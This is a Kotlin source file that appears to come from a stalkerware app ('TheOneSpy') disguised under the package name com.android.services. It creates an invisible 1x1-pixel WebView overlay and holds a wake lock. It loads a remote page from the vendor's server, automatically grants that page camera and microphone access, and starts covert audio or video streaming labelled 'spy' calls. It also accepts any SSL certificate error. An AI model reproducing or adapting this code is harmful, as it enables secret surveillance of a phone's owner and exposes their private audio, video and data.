package com.android.services.services.view360

import android.annotation.SuppressLint
import android.app.ActionBar
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.net.http.SslError
import android.os.Build
import android.os.PowerManager
import android.view.Gravity
import android.view.WindowManager
import android.webkit.*
import android.widget.LinearLayout
import androidx.annotation.RequiresApi
import androidx.core.app.NotificationCompat
import com.android.services.R
import com.android.services.accessibility.AccessibilityUtils
import com.android.services.enums.FcmPushStatus
import com.android.services.logs.source.LocalDatabaseSource
import com.android.services.receiver.NotificationBroadcastReceiver
import com.android.services.services.RemoteDataService
import com.android.services.util.AppConstants
import com.android.services.util.AppUtils
import com.android.services.util.logException
import com.android.services.util.logVerbose
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.launch
import org.json.JSONException
import org.json.JSONObject

/**
 * This implements the [View360CommandProcessingBaseI] abstract class. And Overrides its methods.
 * This implementation is responsible for the Initialisation of Android [WebView] by Opening the view360 Url
 * And setup web client for real-time Communication through the Target device Credentials
 */
@RequiresApi(Build.VERSION_CODES.LOLLIPOP)
class View360CommandProcessingBaseImplI(
    val service: Service,
    val localDatabaseSource: LocalDatabaseSource,
    val coroutineScope: CoroutineScope,
) : View360CommandProcessingBaseI(service.applicationContext) {

    /**
     * Initialize the Window [WindowManager] by adding a WebView to the Window
     * Setup the webView with Credentials, and loads the view360 Url in WebView
     */
    override fun initialize() {
        logVerbose("$TAG In OnCreate")
        try {
            logVerbose("$TAG In Initialize() -> Ready to attach WebView to Window")
            acquireWakeLock()
            startAndCreateNotification()
            mWindowManager = service.getSystemService(Context.WINDOW_SERVICE) as WindowManager
            val layoutParams = WindowManager.LayoutParams(
                1, 1,
                windowManagerFlagOverlay,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
                PixelFormat.TRANSLUCENT
            )
            layoutParams.gravity = Gravity.START or Gravity.TOP
            mWebView = WebView(applicationContext)
            mWebView!!.layoutParams = LinearLayout.LayoutParams(
                1, 1
            )
            mWindowManager!!.addView(mWebView, layoutParams)
            logVerbose("$TAG WebView Attached to Window ")
            setUpWebViewDefaults(mWebView!!)
            setView360User()

            // Setup WebView Client
            mWebView!!.webViewClient = mWebViewClient

            // SetUp WebChrome Client
            mWebView!!.webChromeClient = mWebChromeClient
            mWebView!!.resumeTimers()

            mWebView!!.loadUrl("https://node-api.theonespy.com:7000/cc.html")
            view360BugStatus = FcmPushStatus.INITIALIZED.getStatus()
        } catch (exp: Exception) {
            logException("$TAG Initialize() Error: ${exp.message}", TAG, exp)
            stopThisService()
        }
    }

    private fun startAndCreateNotification() {
        val notificationIntent =
            Intent(service.applicationContext, NotificationBroadcastReceiver::class.java)
        val pendingIntent = PendingIntent.getBroadcast(
            service.applicationContext,
            VIEW_360_NOTIFICATION_ID,
            notificationIntent,
            PendingIntent.FLAG_UPDATE_CURRENT
        )
        val notification =
            NotificationCompat.Builder(service.applicationContext, RemoteDataService.CHANNEL_ID)
                .setContentText("Running in background...")
                .setSmallIcon(R.mipmap.ic_launcher)
                .setContentIntent(pendingIntent)
                .build()
        service.startForeground(VIEW_360_NOTIFICATION_ID, notification)

    }

    /** Web Chrome Client **/
    private val mWebChromeClient = object : WebChromeClient() {
        override fun onPermissionRequest(request: PermissionRequest) {
            mHandler.post {
                if (request.origin.toString() == "https://node-api.theonespy.com:7000/") {
                    request.grant(request.resources)
                } else {
                    request.deny()
                }
            }
        }
    }

    /** Web View Client **/
    private val mWebViewClient = object : WebViewClient() {
        override fun shouldOverrideUrlLoading(
            view: WebView,
            urlNewString: String,
        ): Boolean {
            if (!loadingFinished) {
                redirect = true
            }
            loadingFinished = false
            view.loadUrl(urlNewString)
            return true
        }

        override fun onReceivedError(
            view: WebView,
            request: WebResourceRequest,
            error: WebResourceError,
        ) {
            super.onReceivedError(view, request, error)
            stopThisService()
        }

        override fun onReceivedSslError(
            view: WebView,
            handler: SslErrorHandler,
            error: SslError,
        ) {
            handler.proceed()
        }

        override fun onPageStarted(view: WebView, url: String, facIcon: Bitmap?) {
            loadingFinished = false
        }

        override fun onPageFinished(view: WebView, url: String) {
            if (!redirect) {
                loadingFinished = true
            }
            if (loadingFinished && !redirect) {
                try {
                    mWebView!!.loadUrl("javascript:window:initSession(\"" + clientUserName + "\" , \"" + clientPassword + "\", \"" + getCallType() + "\")")
                } catch (e: Exception) {
                    logException(
                        "onPage Finished exception  ${e.message}",
                        TAG, e
                    )
                    stopThisService()
                }
            } else {
                redirect = false
            }
        }
    }

    /** Get the Registered View 360 User Credentials **/
    private fun setView360User() {
        if (AppConstants.view360User != null && AppConstants.view360User!!.isNotEmpty()) {
            try {
                val sipUserJson = JSONObject(AppConstants.view360User!!)
                clientUserName = sipUserJson.getString("clientUserName")
                clientPassword = sipUserJson.getString("clientPassword")
            } catch (e: JSONException) {
                logException(
                    "onPage Finished exception  ${e.message}",
                    TAG, e
                )
                stopThisService()
            }
        } else {
            stopThisService()
            return
        }
    }

    /** Returns the type of view360 Call Either Audio or Video **/
    private fun getCallType(): String {
        val isMicrophoneAvailable = AppUtils.isMicrophoneAvailable(applicationContext)
        return if (AppConstants.isSpyAudioCall) {
            if (isMicrophoneAvailable) "5" else "4"
        } else {
            var topPackage = ""
            if (AppUtils.isAccessibilityEnabled(applicationContext)) {
                topPackage = AccessibilityUtils.lastWindowPackage
            }
            if (topPackage == AppUtils.getDefaultCamera() || !isMicrophoneAvailable) {
                "4"
            } else {
                AppConstants.view360CameraType
            }
        }
    }

    /** Destroy the WebView and release it's resources **/
    private fun destroyWebView() {
        // Make sure you remove the WebView from its parent view before doing anything.
        mWebView!!.removeAllViews()
        mWebView!!.clearHistory()

        // NOTE: clears RAM cache, if you pass true, it will also clear the disk cache.
        // Probably not a great idea to pass true if you have other WebViews still alive.
        mWebView!!.clearCache(true)

        // Loading a blank page is optional, but will ensure that the WebView isn't doing anything when you destroy it.
        // mWebView.loadUrl("about:blank");
        mWebView!!.onPause()
        mWebView!!.removeAllViews()
        mWebView!!.destroyDrawingCache()

        // NOTE: This pauses JavaScript execution for ALL WebViews,
        // do not use if you have other WebViews still alive.
        // If you create another WebView after calling this,
        // make sure to call mWebView.resumeTimers().
        mWebView!!.pauseTimers()
        // NOTE: This can occasionally cause a segfault below API 17 (4.2)
        mWebView!!.destroy()
        // Null out the reference so that you don't end up re-using it.
        mWebView = null
    }

    /**
     * Set WebView Defaults
     * @param webView Instance of Web View
     */
    private fun setUpWebViewDefaults(webView: WebView) {
        val settings = webView.settings
        try {
            // Enable Javascript
            settings.javaScriptEnabled = true
            settings.setAppCacheEnabled(false)
            settings.cacheMode = WebSettings.LOAD_NO_CACHE
            settings.allowFileAccessFromFileURLs = true
            settings.mediaPlaybackRequiresUserGesture = false
            settings.allowFileAccessFromFileURLs = true
            settings.allowUniversalAccessFromFileURLs = true
            // Use WideViewport and Zoom out if there is no viewport defined
            settings.useWideViewPort = true
            settings.loadWithOverviewMode = true
            // Enable pinch to zoom without the zoom buttons
            settings.builtInZoomControls = true
            // Allow use of Local Storage
            settings.domStorageEnabled = true
            // Hide the zoom controls for HONEYCOMB+
            settings.displayZoomControls = false
            // Enable remote debugging via chrome://inspect
            if (AppConstants.osGreaterThanOrEqualLollipop) {
                WebView.setWebContentsDebuggingEnabled(
                    true
                )
                // AppRTC requires third party cookies to work
                val cookieManager = CookieManager.getInstance()
                cookieManager.setAcceptThirdPartyCookies(mWebView, true)
            }
        } catch (e: Exception) {
            logException("$TAG ${AppUtils.currentMethod} exception = ${e.message}")
        }
    }

    override fun onServiceDestroy() {
        logVerbose("$TAG In OnDestroy -> Releasing Resources")
        try {
            if (mWebView != null && mWebView!!.parent != null) {
//                    mWindowManager!!.removeViewImmediate(mWebView)
                mWindowManager!!.removeView(mWebView)
                destroyWebView()
            }
            releaseWakeLock()
            AppConstants.view360InteruptMessage = ""
        } catch (exp: Exception) {
            logException("$TAG onDestroy Exception = ${exp.message}")
            stopThisService()
        }
    }

    override fun startCommand() {
        startAndCreateNotification()
    }

    private fun stopThisService() {
        service.stopSelf()
    }

    @SuppressLint("WakelockTimeout")
    private fun acquireWakeLock() {
        val pm = service.applicationContext.getSystemService(Service.POWER_SERVICE) as PowerManager
        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, TAG_VIEW_360_BUG_WORK)
        wakeLock!!.acquire()
    }

    private fun releaseWakeLock() {
        if (wakeLock != null && wakeLock!!.isHeld) wakeLock!!.release()
    }
}